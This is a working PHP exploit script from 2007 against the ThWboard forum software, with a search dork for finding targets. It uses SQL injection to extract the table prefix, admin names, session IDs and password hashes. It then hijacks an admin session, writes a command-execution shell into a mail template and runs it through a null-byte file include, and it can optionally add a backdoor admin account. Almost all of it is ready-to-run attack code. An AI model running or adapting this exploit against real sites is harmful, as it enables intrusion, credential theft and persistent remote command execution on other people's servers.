<?php
print_r('
-----------------------------------------------------------------------------
ThWboard <=3.0 beta 2.84-php5 board[styleid] sql injection / cmd exec exploit
by rgod
dork: "powered by ThWboard"
version specific:
"powered by ThWboard 3 Beta 2.84-php5" "by * Baecher & * Gonschorek"
mail: retrog at alice dot it
site: http://retrogod.altervista.org
-----------------------------------------------------------------------------
');

if ($argc<5) {
    print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path action argument [options]
host:      target server (ip/hostname)
path:      path to ThWboard
action:    [1] launch commands
           [2] disclose md5 hash of a certain user
argument:  a shell comand for action 1
           a username for action 2
Options:
 -a           additionally add a new admin user when action 1
              is performed
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Examples:
php '.$argv[0].' localhost /ThWboard/ 1 ls -la -P1.1.1.1:80
php '.$argv[0].' localhost /ThWboard/ 1 cat ./inc/config.inc.php -P1.1.1.1:80
php '.$argv[0].' localhost / 2 admin -p81
-----------------------------------------------------------------------------
');
    die;
}

error_reporting("E_ALL");
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$action=(int)$argv[3];
if (($action<>1) and ($action<>2)){die("wrong action...");}
$port=80;
$proxy="";
$argu="";
$admin_add=0;
for ($i=4; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P") and ($temp<>"-a")) {$argu.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
  $tmp=explode(":",$proxy);
  $your_ip=$tmp[0];
}
if ($action==1){
   if ($temp=="-a"){
       $admin_add=1;
   }
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
/*
download link: http://www.thwboard.de/downloads.php

explaination:
sql injection in /inc/header.inc.php near lines 535-560 ($board[styleid] var):

...
if(empty($board['styleid']))
{
  if(isset($g_user['styleid']))
    {
      $board['styleid'] = $g_user['styleid'];
    }
  else
    {
      $board['styleid'] = STYLE_DEFAULT;
    }
}

if( $board['styleid'] == STYLE_DEFAULT )
{
	$r_style = thwb_query("SELECT styleid, styletemplate, colorbg, color1, CellA, CellB, color4, colorbgfont, col_he_fo_font, color_err,
		col_link, col_link_v, col_link_hover, stdfont,
		boardimage, newtopicimage, border_col FROM
		".$pref."style WHERE styleisdefault=1");
}
else
{
	$r_style = thwb_query("SELECT styleid, styletemplate, colorbg, color1, CellA, CellB, color4, colorbgfont, col_he_fo_font, color_err,
		col_link, col_link_v, col_link_hover, stdfont,
		boardimage, newtopicimage, border_col FROM
		".$pref."style WHERE styleid=$board[styleid]");
}
...

( we have this code also in /inc/header.inc.php near lines 74-83:

...
if( !empty($_REQUEST) )
	extract($_REQUEST, EXTR_SKIP);

if( get_magic_quotes_gpc() )
{
	$HTTP_GET_VARS = r_stripslashes($HTTP_GET_VARS);
	$HTTP_POST_VARS = r_stripslashes($HTTP_POST_VARS);
	$HTTP_COOKIE_VARS = r_stripslashes($HTTP_COOKIE_VARS);
	$GLOBALS = r_stripslashes($GLOBALS);
}
...

so, this works regardless of php.ini settings
the extract() one turn register_globals =on on undefinied vars
the second one turn magic_quotes off
)

also the styletemplate value of returned array is used to include files locally
near lines 648-651:

...
if( file_exists('./templates/' . $style['styletemplate'] . '/dynamic.inc.php') )
{
	@include('./templates/' . $style['styletemplate'] . '/dynamic.inc.php');
}
...

so this can used to execute command even if the supplied value is like
'../templates/mail/newreply.mail[null char]'

and if you insert some code in newreply.mail file as admin

query errors and failed includes are showned at screen so you can have the table prefix
and you can extract hashes and session ids from the database:

...
<pre><b>ThWboard Error</b><br>MySQL: Errore di sintassi nella query SQL vicino
 'mphhhh.../*' linea 4
Query: SELECT styleid, styletemplate, colorbg, color1, CellA, CellB, color4, co
orbgfont, col_he_fo_font, color_err,
                col_link, col_link_v, col_link_hover, stdfont,
                boardimage, newtopicimage, border_col FROM
                tb_style WHERE styleid=[your input]]</pre>
...
<pre>Template error:
 unable to load template file: 'templates/[your input]/frame.html' does not exist.</pre>
...

finally you do not need to decrypt md5 hashes, you can perform some action as admin
by stealing the session id stored in the database, this one has ten minutes life
and is renewed every time an "admin action" is performed by the legitimate
admin user or by the attacker, also is not deleted after he does logout

this exploit tries to launch commands during the admin session id lifetime,
if succeeded you can additionally add a new admin with username 'suntzu' and password 'suntzu'
(action 1) otherwise you can perform action 2 to disclose the hash of a certain user
which is used inside cookies to authenticate him to the board (but not to the admin section, if the
hash is the admin user one)
*/

//disclose table prefix...
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"board[styleid]\";\r\n\r\n";
$data.="999999/**/mphhhh.../*\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (!eregi("<pre><b>ThWboard Error</b><br>",$html)){die("not vulnerable...");}
$temp=explode("border_col FROM\n",$html);
$temp2=explode("style WHERE",$temp[1]);
$prefix=trim($temp2[0]);
echo "table prefix -> ".$prefix."\n";
if ($action ==1){

//disclose admin username...
$SQL="9999999/**/UNION/**/SELECT/**/null,username,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/".$prefix."user/**/WHERE/**/userisadmin=1/*";
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"board[styleid]\";\r\n\r\n";
$data.="$SQL\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("<pre><b>ThWboard Error</b><br>",$html)){echo $html; die("\n\nquery error... see html");}
$temp=explode("templates/",$html);
$temp2=explode("/",$temp[1]);
$admin=$temp2[0];
echo "admin        -> ".$admin."\n";
if ($admin==""){echo $html; die("\nerror...see html\n");}
//if already executed and new admin added, use the suntzu user session id
$SQL="9999999/**/UNION/**/SELECT/**/null,sessionid,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/".$prefix."session/**/WHERE/**/username=".my_encode("suntzu")."/*";
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"board[styleid]\";\r\n\r\n";
$data.="$SQL\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("templates/",$html);
$temp2=explode("/",$temp[1]);
$sess_id=$temp2[0];
if ($sess_id<>""){
    echo "session id   -> ".$sess_id."\n";
}
else
{
//disclose session id...
$SQL="9999999/**/UNION/**/SELECT/**/null,sessionid,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/".$prefix."session/**/WHERE/**/username=".my_encode(trim($admin))."/*";
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"board[styleid]\";\r\n\r\n";
$data.="$SQL\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("templates/",$html);
$temp2=explode("/",$temp[1]);
$sess_id=$temp2[0];
echo "session id   -> ".$sess_id."\n";
}
if ($sess_id==""){echo $html; die("\nerror...see html\n");}
//inject shell...
$shell="<?php error_reporting(0);set_time_limit(0);echo \"my_delim\";passthru(\$_SERVER[HTTP_SUNTZU]);echo \"my_delim\";";
if ($admin_add){$shell.="mysql_query(\"INSERT INTO ".$prefix."user(userid,username,userpassword,userisadmin,groupids,usernodelete) VALUES ('999999','suntzu','".md5("suntzu")."',1,',3,','1')\");";}
$shell.="die;?>";
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"session\";\r\n\r\n";
$data.="$sess_id\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"action\";\r\n\r\n";
$data.="save_newreply\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"new_newreply\";\r\n\r\n";
$data.="$shell\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."admin/mails.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
echo "editing newreply.mail file...\n";
if (eregi("<form name=\"login\" method=\"post\" action=\"index.php\">",$html))
{die("ten minutes after the last admin action... time exceeded...");}
else
{echo "succeeded...\n";
}

//launch commands...
$SQL="9999999/**/UNION/**/SELECT/**/null,".my_encode("../templates/mail/newreply.mail\x00").",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/".$prefix."user/**/WHERE/**/userisadmin=1/*";
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"board[styleid]\";\r\n\r\n";
$data.="$SQL\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="SUNTZU: ".$argu."\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("my_delim",$html)){
    $temp=explode("my_delim",$html);
    echo $temp[1];
    if ($add_admin) {echo "admin user added with username 'suntzu' and password 'suntzu'...";}
}else {echo "exploit failed...";}
}
elseif ($action==2)
{

function is_hash($hash)
{
 if (ereg("([a-f0-9]{32})",trim($hash))) {return true;}
 else {return false;}
}

$SQL="9999999/**/UNION/**/SELECT/**/null,userpassword,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/".$prefix."user/**/WHERE/**/username=".my_encode(trim($argu))."/*";
$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"board[styleid]\";\r\n\r\n";
$data.="$SQL\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="SUNTZU: ".$argu."\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("<pre><b>ThWboard Error</b><br>",$html)){echo $html; die("\n\nquery error... see html");}
$temp=explode("templates/",$html);
$temp2=explode("/",$temp[1]);
$pwd_hash=$temp2[0];
if (is_hash($pwd_hash)) {
    die("pwd hash (md5) -> ".$pwd_hash."\n");
}
if (eregi("templates//frame.html",$html)){echo "no user with given name...\n";}
echo( "exploit failed...\n\n".$html);
}
?>

# milw0rm.com [2007-01-14]
